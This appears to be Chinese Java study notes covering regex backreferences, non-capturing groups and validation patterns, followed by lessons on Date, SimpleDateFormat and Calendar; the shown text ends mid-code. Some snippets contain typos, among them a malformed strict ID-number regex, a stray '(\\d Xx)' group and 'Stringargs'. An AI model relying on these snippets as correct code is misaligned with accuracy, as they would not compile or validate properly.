<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//需求1:判断一个字符串的开始字符和结束字符是否一致?只考虑一个字符</span></span><br><span class="line"><span class="comment">//举例: a123a b456b 17891 &amp;abc&amp; a123b(false)</span></span><br><span class="line"><span class="comment">// \\组号:表示把第X组的内容再出来用一次</span></span><br><span class="line"><span class="type">String</span> <span class="variable">regex1</span> <span class="operator">=</span> <span class="string">&quot;(.).+\\1&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;a123a&quot;</span>.matches(regex1));</span><br><span class="line">System.out.println(<span class="string">&quot;b456b&quot;</span>.matches(regex1));</span><br><span class="line">System.out.println(<span class="string">&quot;17891&quot;</span>.matches(regex1));</span><br><span class="line">System.out.println(<span class="string">&quot;&amp;abc&amp;&quot;</span>.matches(regex1));</span><br><span class="line">System.out.println(<span class="string">&quot;a123b&quot;</span>.matches(regex1));</span><br><span class="line">System.out.println(<span class="string">&quot;--------------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//需求2:判断一个字符串的开始部分和结束部分是否一致?可以有多个字符</span></span><br><span class="line"><span class="comment">//举例: abc123abc b456b 123789123 &amp;!@abc&amp;!@ abc123abd(false)</span></span><br><span class="line"><span class="type">String</span> <span class="variable">regex2</span> <span class="operator">=</span> <span class="string">&quot;(.+).+\\1&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;abc123abc&quot;</span>.matches(regex2));</span><br><span class="line">System.out.println(<span class="string">&quot;b456b&quot;</span>.matches(regex2));</span><br><span class="line">System.out.println(<span class="string">&quot;123789123&quot;</span>.matches(regex2));</span><br><span class="line">System.out.println(<span class="string">&quot;&amp;!@abc&amp;!@&quot;</span>.matches(regex2));</span><br><span class="line">System.out.println(<span class="string">&quot;abc123abd&quot;</span>.matches(regex2));</span><br><span class="line">System.out.println(<span class="string">&quot;---------------------&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//需求3:判断一个字符串的开始部分和结束部分是否一致?开始部分内部每个字符也需要一致</span></span><br><span class="line"><span class="comment">//举例: aaa123aaa bbb456bbb 111789111 &amp;&amp;abc&amp;&amp;</span></span><br><span class="line"><span class="comment">//(.):把首字母看做一组</span></span><br><span class="line"><span class="comment">// \\2:把首字母拿出来再次使用</span></span><br><span class="line"><span class="comment">// *:作用于\\2,表示后面重复的内容出现日次或多次</span></span><br><span class="line"><span class="type">String</span> <span class="variable">regex3</span> <span class="operator">=</span> <span class="string">&quot;((.)\\2*).+\\1&quot;</span>;</span><br><span class="line">System.out.println(<span class="string">&quot;aaa123aaa&quot;</span>.matches(regex3));</span><br><span class="line">System.out.println(<span class="string">&quot;bbb456bbb&quot;</span>.matches(regex3));</span><br><span class="line">System.out.println(<span class="string">&quot;111789111&quot;</span>.matches(regex3));</span><br><span class="line">System.out.println(<span class="string">&quot;&amp;&amp;abc&amp;&amp;&quot;</span>.matches(regex3));</span><br><span class="line">System.out.println(<span class="string">&quot;aaa123aab&quot;</span>.matches(regex3));</span><br></pre></td></tr></table></figure>
<h3 id="分组练习"><a class="header-anchor" href="#分组练习">¶</a>分组练习</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;我要学学编编编编程程程程程程&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//需求:把重复的内容 替换为 单个的</span></span><br><span class="line"><span class="comment">//学学                学</span></span><br><span class="line"><span class="comment">//编编编编            编</span></span><br><span class="line"><span class="comment">//程程程程程程        程</span></span><br><span class="line"><span class="comment">//  (.)表示把重复内容的第一个字符看做一组</span></span><br><span class="line"><span class="comment">//  \\1表示第一字符再次出现</span></span><br><span class="line"><span class="comment">//  + 至少一次</span></span><br><span class="line"><span class="comment">//  $1 表示把正则表达式中第一组的内容，再拿出来用</span></span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> str.replaceAll(<span class="string">&quot;(.)\\1+&quot;</span>, <span class="string">&quot;$1&quot;</span>);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure>
<h3 id="忽略大小写的写法"><a class="header-anchor" href="#忽略大小写的写法">¶</a>忽略大小写的写法</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//(?i) ：表示忽略后面数据的大小写</span></span><br><span class="line"><span class="comment">//忽略abc的大小写</span></span><br><span class="line"><span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;(?i)abc&quot;</span>;</span><br><span class="line"><span class="comment">//a需要一模一样，忽略bc的大小写</span></span><br><span class="line"><span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;a(?i)bc&quot;</span>;</span><br><span class="line"><span class="comment">//ac需要一模一样，忽略b的大小写</span></span><br><span class="line"><span class="type">String</span> <span class="variable">regex</span> <span class="operator">=</span> <span class="string">&quot;a((?i)b)c&quot;</span>;</span><br></pre></td></tr></table></figure>
<h3 id="非捕获分组"><a class="header-anchor" href="#非捕获分组">¶</a>非捕获分组</h3>
<ul>
<li>非捕获分组：分组之后不需要再用本组数据，仅仅是把数据括起来</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//身份证号码的简易正则表达式</span></span><br><span class="line"><span class="comment">//非捕获分组:仅仅是把数据括起来</span></span><br><span class="line"><span class="comment">//特点:不占用组号</span></span><br><span class="line"><span class="comment">//这里\\1报错原因:(?:)就是非捕获分组，此时是不占用组号的。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//(?:) (?=) (?!)都是非捕获分组//更多的使用第一个</span></span><br><span class="line"><span class="comment">//String regex1 =&quot;[1-9]\\d&#123;16&#125;(?:\\d|x|x)\\1&quot;;</span></span><br><span class="line"><span class="type">String</span> <span class="variable">regex2</span> <span class="operator">=</span><span class="string">&quot;[1-9]\\d&#123;16&#125;(\\d Xx)\\1&quot;</span>;</span><br><span class="line"><span class="comment">//^([01]\d|2[0-3]):[0-5]\d:[@-5]\d$</span></span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;41080119930228457x&quot;</span>.matches(regex2));</span><br></pre></td></tr></table></figure>
<h3 id="正则表达式练习"><a class="header-anchor" href="#正则表达式练习">¶</a>正则表达式练习</h3>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">手机号码:<span class="number">1</span>[<span class="number">3</span>-<span class="number">9</span>]\\d&#123;<span class="number">9</span>&#125;</span><br><span class="line">座机号码：<span class="number">0</span>\\d&#123;<span class="number">2</span>,<span class="number">3</span>&#125;-?[<span class="number">1</span>-<span class="number">9</span>]\\d&#123;<span class="number">4</span>,<span class="number">9</span>&#125;</span><br><span class="line">邮箱号码：\\w+@[\\w&amp;&amp;[^_]]&#123;<span class="number">2</span>,<span class="number">6</span>&#125;(\\.[a-zA-Z]&#123;<span class="number">2</span>,<span class="number">3</span>&#125;)&#123;<span class="number">1</span>,<span class="number">2</span>&#125;</span><br><span class="line"><span class="number">24</span>小时：([<span class="number">01</span>]\\d|<span class="number">2</span>[<span class="number">0</span>-<span class="number">3</span>]):[<span class="number">0</span>-<span class="number">5</span>]\\d:[<span class="number">0</span>-<span class="number">5</span>]\\d</span><br><span class="line">           ([<span class="number">01</span>]\\d|<span class="number">2</span>[<span class="number">0</span>-<span class="number">3</span>])(:[<span class="number">0</span>-<span class="number">5</span>]\\d)&#123;<span class="number">2</span>&#125;</span><br><span class="line">用户名:        \\w&#123;<span class="number">4</span>,<span class="number">16</span>&#125;</span><br><span class="line">身份证号码，简单校验：</span><br><span class="line">                [<span class="number">1</span>-<span class="number">9</span>]\\d&#123;<span class="number">16</span>&#125;(\\d|X|x)</span><br><span class="line">                [<span class="number">1</span>-<span class="number">9</span>]\\d&#123;<span class="number">16</span>&#125;[\\dXx]</span><br><span class="line">                [<span class="number">1</span>-<span class="number">9</span>]\\d&#123;<span class="number">16</span>&#125;(\\d(?i)X)</span><br><span class="line">身份证号码，严格校验：</span><br><span class="line">                [<span class="number">1</span>-<span class="number">9</span>]\\d&#123;<span class="number">5</span>&#125;(<span class="number">18</span>|<span class="number">19</span>|<span class="number">20</span>)\\d&#123;<span class="number">2</span>&#125;(<span class="number">0</span>[<span class="number">1</span>-<span class="number">9</span>]|<span class="number">1</span>[<span class="number">0</span>-<span class="number">2</span>])(<span class="number">0</span>[<span class="number">1</span>-<span class="number">9</span>|[<span class="number">12</span>])\\d|<span class="number">3</span>[<span class="number">01</span>])\\d&#123;<span class="number">3</span>&#125;[\\dXx]</span><br></pre></td></tr></table></figure>
<h2 id="Day20-API（时间，包装类，练习）"><a class="header-anchor" href="#Day20-API（时间，包装类，练习）">¶</a>Day20 API（时间，包装类，练习）</h2>
<h3 id="学习目标-v5"><a class="header-anchor" href="#学习目标-v5">¶</a>学习目标</h3>
<ul>
<li>能够使用日期类输出当前日期</li>
<li>能够使用将日期格式化为字符串的方法</li>
<li>能够使用将字符串转换成日期的方法</li>
<li>能够说出8种基本类型对应的包装类名称</li>
<li>能够说出自动装箱、自动拆箱的概念</li>
<li>能够将字符串转换为对应的基本类型</li>
<li>能够将基本类型转换为对应的字符串</li>
<li>能够完成课题上讲解的所有练习</li>
</ul>
<h3 id="Date类"><a class="header-anchor" href="#Date类">¶</a>Date类</h3>
<ul>
<li>
<p><code>java.util.Date</code>类 表示特定的瞬间，精确到毫秒</p>
</li>
<li>
<p>多个过时的构造函数</p>
<ul>
<li><code>public Date()</code>： 从运行程序的此时此刻到时间原点经历的毫秒值，转换成Date对象，分配Date对象并初始化此对象，以表示分配它的时间（精确到毫秒）</li>
<li><code>public Date(long date)</code>：将指定参数的毫秒值date,转换成Date对象，分配Date对象并初始化此对象，以表示自从标准基准时间（称为“历元（epoch）”，即1970年1月1日00:00:00 GMT）以来的指定毫秒数</li>
</ul>
<blockquote>
<p>tips: 由于中国处于东八区（GMT+08:00）是比世界协调时间/格林尼治时间（GMT）快8小时的时区，当格林尼治标准时间为0:00时，东八区的标准时间为08:00</p>
</blockquote>
</li>
<li>
<p>使用无参构造，可以自动设置当前系统时间的毫秒时刻；指定long类型的构造参数，可以自定义毫秒时刻</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo01Date</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 创建日期对象，把当前的时间</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">Date</span>()); <span class="comment">// Tue Jan 16 14:37:35 CST 2020</span></span><br><span class="line">        <span class="comment">// 创建日期对象，把当前的毫秒值转成日期对象</span></span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">0L</span>)); <span class="comment">// Thu Jan 01 08:00:00 CST 1970</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>tips:在使用println方法时，会自动调用Date类中的toString方法。Date类对Object类中的toString方法进行了覆盖重写，所以结果为指定格式的字符串。</p>
</blockquote>
<h4 id="Date类常用方法"><a class="header-anchor" href="#Date类常用方法">¶</a>Date类常用方法</h4>
<ul>
<li>多数方法已经过时：
<ul>
<li><code>public long getTime()</code> 把日期对象转换成对应的时间毫秒值</li>
<li><code>public void setTime(long time)</code> 把方法参数给定的毫秒值设置给日期对象</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateDemo02</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//创建日期对象</span></span><br><span class="line">        <span class="type">Date</span> <span class="variable">d</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line">        <span class="comment">//public long getTime():获取的是日期对象从1970年1月1日 00:00:00到现在的毫秒值</span></span><br><span class="line">        <span class="comment">//System.out.println(d.getTime());</span></span><br><span class="line">        <span class="comment">//System.out.println(d.getTime() * 1.0 / 1000 / 60 / 60 / 24 / 365 + &quot;年&quot;);</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//public void setTime(long time):设置时间，给的是毫秒值</span></span><br><span class="line">        <span class="comment">//long time = 1000*60*60;</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        d.setTime(time);</span><br><span class="line"></span><br><span class="line">        System.out.println(d);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>小结：Date表示特定的时间瞬间，我们可以使用Date对象对时间进行操作</p>
</blockquote>
<h3 id="SimpleDateFormat类"><a class="header-anchor" href="#SimpleDateFormat类">¶</a>SimpleDateFormat类</h3>
<ul>
<li><code>java.text.SimpleDateFormat</code> 是日期/时间格式化类，我们通过这个类可以帮我们完成日期和文本之间的转换,也就是可以在Date对象与String对象之间进行来回转换
<ul>
<li><strong>格式化</strong>：按照指定的格式，把Date对象转换为String对象</li>
<li><strong>解析</strong>：按照指定的格式，把String对象转换为Date对象</li>
</ul>
</li>
</ul>
<h4 id="构造方法-v5"><a class="header-anchor" href="#构造方法-v5">¶</a>构造方法</h4>
<ul>
<li>
<p>由于DateFormat为抽象类，不能直接使用，所以需要常用的子类<code>java.text.SimpleDateFormat</code>。这个类需要一个模式（格式）来指定格式化或解析的标准</p>
</li>
<li>
<p>构造方法：</p>
<ul>
<li><code>public SimpleDateFormat(String pattern)</code>：用给定的模式和默认语言环境的日期格式符号构造SimpleDateFormat。参数pattern是一个字符串，代表日期时间的自定义格式</li>
</ul>
</li>
</ul>
<h4 id="格式规则"><a class="header-anchor" href="#格式规则">¶</a>格式规则</h4>
<table>
<thead>
<tr>
<th>标识字母（区分大小写）</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>y</td>
<td>年</td>
</tr>
<tr>
<td>M</td>
<td>月</td>
</tr>
<tr>
<td>d</td>
<td>日</td>
</tr>
<tr>
<td>H</td>
<td>时</td>
</tr>
<tr>
<td>m</td>
<td>分</td>
</tr>
<tr>
<td>s</td>
<td>秒</td>
</tr>
</tbody>
</table>
<blockquote>
<p>更详细的格式规则，可以参考SimpleDateFormat类的API文档</p>
</blockquote>
<h4 id="常用方法"><a class="header-anchor" href="#常用方法">¶</a>常用方法</h4>
<ul>
<li><code>DateFormat类</code>的
<ul>
<li><code>public String format(Date date)</code>：将Date对象格式化为字符串</li>
<li><code>public Date parse(String source)</code>：将字符串解析为Date对象</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.itheima.a01jdk7datedemo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"><span class="keyword">import</span> java.text.SimpleDateFormat;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">A03_SimpleDateFormatDemo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(Stringargs)</span> <span class="keyword">throws</span> ParseException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            public simpleDateFormat() 默认格式</span></span><br><span class="line"><span class="comment">            public simpleDateFormat(String pattern) 指定格式</span></span><br><span class="line"><span class="comment">            public final string format(Date date) 格式化(日期对象 -&gt;字符串)</span></span><br><span class="line"><span class="comment">            public Date parse(string source) 解析(字符串 -&gt;日期对象)</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//1.定义一个字符串表示时间</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;2023-11-11 11:11:11&quot;</span>;</span><br><span class="line">        <span class="comment">//2.利用空参构造创建simpleDateFormat对象</span></span><br><span class="line">        <span class="comment">// 细节:</span></span><br><span class="line">        <span class="comment">//创建对象的格式要跟字符串的格式完全一致</span></span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> sdf.parse(str);</span><br><span class="line">        <span class="comment">//3.打印结果</span></span><br><span class="line">        System.out.println(date.getTime());<span class="comment">//1699672271000</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">method1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//1.利用空参构造创建simpleDateFormat对象，默认格式</span></span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>();</span><br><span class="line">        <span class="type">Date</span> <span class="variable">d1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>(<span class="number">0L</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> sdf1.format(d1);</span><br><span class="line">        System.out.println(str1);<span class="comment">//1970/1/1 上午8:00</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.利用带参构造创建simpleDateFormat对象，指定格式</span></span><br><span class="line">        <span class="type">SimpleDateFormat</span> <span class="variable">sdf2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy年MM月dd日HH:mm:ss&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> sdf2.format(d1);</span><br><span class="line">        System.out.println(str2);<span class="comment">//1970年01月01日 08:00:00</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//课堂练习:yyyy年MM月dd日 时:分:秒 星期</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>小结：DateFormat可以将Date对象和字符串相互转换</p>
</blockquote>
<h4 id="练习1"><a class="header-anchor" href="#练习1">¶</a>练习1</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">     假设，你初恋的出生年月日为:2000-11-11</span></span><br><span class="line"><span class="comment">     请用字符串表示这个数据，并将其转换为:2000年11月11日</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     创建一个Date对象表示2000年11月11日</span></span><br><span class="line"><span class="comment">     创建一个SimpleDateFormat对象，并定义格式为年月日把时间变成:2000年11月11日</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.可以通过2000-11-11进行解析，解析成一个Date对象</span></span><br><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="string">&quot;2000-11-11&quot;</span>;</span><br><span class="line"><span class="comment">//2.解析</span></span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">sdf1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line"><span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> sdf1.parse(str);</span><br><span class="line"><span class="comment">//3.格式化</span></span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">sdf2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy年MM月dd日&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// DateFormat可以将Date对象和字符串相互转换</span></span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> sdf2.format(date);</span><br><span class="line">System.out.println(result);</span><br></pre></td></tr></table></figure>
<h4 id="练习2"><a class="header-anchor" href="#练习2">¶</a>练习2</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* 需求:</span></span><br><span class="line"><span class="comment">            秒杀活动开始时间:2023年11月11日 0:0:0(毫秒值)</span></span><br><span class="line"><span class="comment">            秒杀活动结束时间:2023年11月11日 0:10:0(毫秒值)</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">            小贾下单并付款的时间为:2023年11月11日 0:01:0</span></span><br><span class="line"><span class="comment">            小皮下单并付款的时间为:2023年11月11日 0:11:0</span></span><br><span class="line"><span class="comment">            用代码说明这两位同学有没有参加上秒杀活动?</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//1.定义字符串表示三个时间</span></span><br><span class="line"><span class="type">String</span> <span class="variable">startstr</span> <span class="operator">=</span> <span class="string">&quot;2023年11月11日 0:0:0&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">endstr</span> <span class="operator">=</span> <span class="string">&quot;2023年11月11日 0:10:0&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">orderstr</span> <span class="operator">=</span> <span class="string">&quot;2023年11月11日 0:01:00&quot;</span>;</span><br><span class="line"><span class="comment">//2.解析上面的三个时间，得到Date对象</span></span><br><span class="line"><span class="type">SimpleDateFormat</span> <span class="variable">sdf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy年MM月dd日HH:mm:ss&quot;</span>);</span><br><span class="line"><span class="type">Date</span> <span class="variable">startDate</span> <span class="operator">=</span> sdf.parse(startstr);</span><br><span class="line"><span class="type">Date</span> <span class="variable">endDate</span> <span class="operator">=</span> sdf.parse(endstr);</span><br><span class="line"><span class="type">Date</span> <span class="variable">orderDate</span> <span class="operator">=</span> sdf.parse(orderstr);</span><br><span class="line"></span><br><span class="line"><span class="comment">//3.得到三个时间的毫秒值</span></span><br><span class="line"><span class="type">long</span> <span class="variable">startTime</span> <span class="operator">=</span> startDate.getTime();</span><br><span class="line"><span class="type">long</span> <span class="variable">endTime</span> <span class="operator">=</span> endDate.getTime();</span><br><span class="line"><span class="type">long</span> <span class="variable">orderTime</span> <span class="operator">=</span> orderDate.getTime();</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.判断</span></span><br><span class="line"><span class="keyword">if</span> (orderTime &gt;= startTime &amp;&amp; orderTime &lt;= endTime) &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;参加秒杀活动成功&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;参加秒杀活动失败&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Calendar类"><a class="header-anchor" href="#Calendar类">¶</a>Calendar类</h3>
<ul>
<li>java.util.Calendar类表示一个“日历类”，可以进行日期运算。它是一个抽象类，不能创建对象，我们可以使用它的子类：java.util.GregorianCalendar类</li>
<li>有两种方式可以获取GregorianCalendar对象：
<ul>
<li>直接创建GregorianCalendar对象；</li>
<li>通过Calendar的静态方法getInstance()方法获取GregorianCalendar对象【√】</li>
</ul>
</li>
</ul>
<h4 id="常用方法-v2"><a class="header-anchor" href="#常用方法-v2">¶</a>常用方法</h4>
<table>
<thead>
<tr>
<th>方法名</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>public static Calendar getInstance()</td>
<td>获取一个它的子类GregorianCalendar对象</td>
</tr>
<tr>
<td>public int get(int field)</td>
<td>获取某个字段的值。field参数表示获取哪个字段的值， 可以使用Calender中定义的常量来表示： Calendar.YEAR : 年 Calendar.MONTH ：月 Calendar.DAY_OF_MONTH：月中的日期 Calendar.HOUR：小时 Calendar.MINUTE：分钟 Calendar.SECOND：秒 Calendar.DAY_OF_WEEK：星期</td>
</tr>
<tr>
<td>public void set(int field,int value)</td>
<td>设置某个字段的值</td>
</tr>
<tr>
<td>public void add(int field,int amount)</td>
<td>为某个字段增加/减少指定的值</td>
</tr>
</tbody>
</table>
<h4 id="get方法示例"><a class="header-anchor" href="#get方法示例">¶</a>get方法示例</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//1.获取一个GregorianCalendar对象</span></span><br><span class="line">        <span class="type">Calendar</span> <span class="variable">instance</span> <span class="operator">=</span> Calendar.getInstance();<span class="comment">//获取子类对象</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//2.打印子类对象</span></span><br><span class="line">        System.out.println(instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//3.获取属性</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">year</span> <span class="operator">=</span> instance.get(Calendar.YEAR);</span><br><span class="line">        <span class="type">int</span> <span class="variable">month</span> <span class="operator">=</span> instance.get(Calendar.MONTH) + <span class="number">1</span>;<span class="comment">//Calendar的月份值是0-11</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">day</span> <span class="operator">=</span> instance.get(Calendar.DAY_OF_MONTH);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">hour</span> <span class="operator">=</span> instance.get(Calendar.HOUR);</span><br><span class="line">        <span class="type">int</span> <span class="variable">minute</span> <span class="operator">=</span> instance.get(Calendar.MINUTE);</span><br><span class="line">        <span class="type">int</span> <span class="variable">second</span> <span class="operator">=</span> instance.get(Calendar.SECOND);</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">week</span> <span class="operator">=</span> instance.get(Calendar.DAY_OF_WEEK);<span class="comment">//返回值范围：1--7，分别表示：&quot;星期日&quot;,&quot;星期一&quot;,&quot;星期二&quot;,...,&quot;星期六&quot;</span></span><br><span class="line"></span><br><span class="line">        System.out.println(year + <span class="string">&quot;年&quot;</span> + month + <span class="string">&quot;月&quot;</span> + day + <span class="string">&quot;日&quot;</span> +</span><br><span class="line">                            hour + <span class="string">&quot;:&quot;</span> + minute + <span class="string">&quot;:&quot;</span> + second);</span><br><span class="line">        System.out.println(getWeek(week));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查表法，查询星期几</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getWeek</span><span class="params">(<span class="type">int</span> w)</span> &#123;<span class="comment">//w = 1 --- 7</span></span><br><span class="line">        <span class="comment">//做一个表(数组)</span></span><br><span class="line">        String[] weekArray = &#123;<span class="string">&quot;星期日&quot;</span>, <span class="string">&quot;星期一&quot;</span>, <span class="string">&quot;星期二&quot;</span>, <span class="string">&quot;星期三&quot;</span>, <span class="string">&quot;星期四&quot;</span>, <span class="string">&quot;星期五&quot;</span>, <span class="string">&quot;星期六&quot;</span>&#125;;</span><br><span class="line">        <span class="comment">//            索引      [0]      [1]       [2]      [3]       [4]      [5]      [6]</span></span><br><span class="line">        <span class="comment">//查表</span></span><br><span class="line">        <span class="keyword">return</span> weekArray[w - <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="set方法示例"><a class="header-anchor" href="#set方法示例">¶</a>set方法示例</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//设置属性——set(int field,int value):</span></span><br><span class="line">    <span class="type">Calendar</span> <span class="variable">c1</span> <span class="operator">=</span> Calendar.getInstance();<span class="comment">//获取当前日期</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//计算班长出生那天是星期几(假如班长出生日期为：1998年3月18日)</span></span><br><span class="line">    c1.set(Calendar.YEAR, <span class="number">1998</span>);</span><br><span class="line">    c1.set(Calendar.MONTH, <span class="number">3</span> - <span class="number">1</span>);<span class="comment">//转换为Calendar内部的月份值</span></span><br><span class="line">    c1.set(Calendar.DAY_OF_MONTH, <span class="number">18</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> <span class="variable">w</span> <span class="operator">=</span> c1.get(Calendar.DAY_OF_WEEK);</span><br><span class="line">    System.out.println(<span class="string">&quot;班长出生那天是：&quot;</span> + getWeek(w));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//查表法，查询星期几</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">getWeek</span><span class="params">(<span class="type">int</span> w)</span> &#123;<span class="comment">//w = 1 --- 7</span></span><br><span class="line">        <span class="comment">//做一个表(数组)</span></span><br><span class="line">        String[] weekArray = &#123;<span class="string">&quot;星期日&quot;</span>, <span class="string">&quot;星期一&quot;</span>, <span class="string">&quot;星期二&quot;</span>, <span class="string">&quot;星期三&quot;</span>, <span 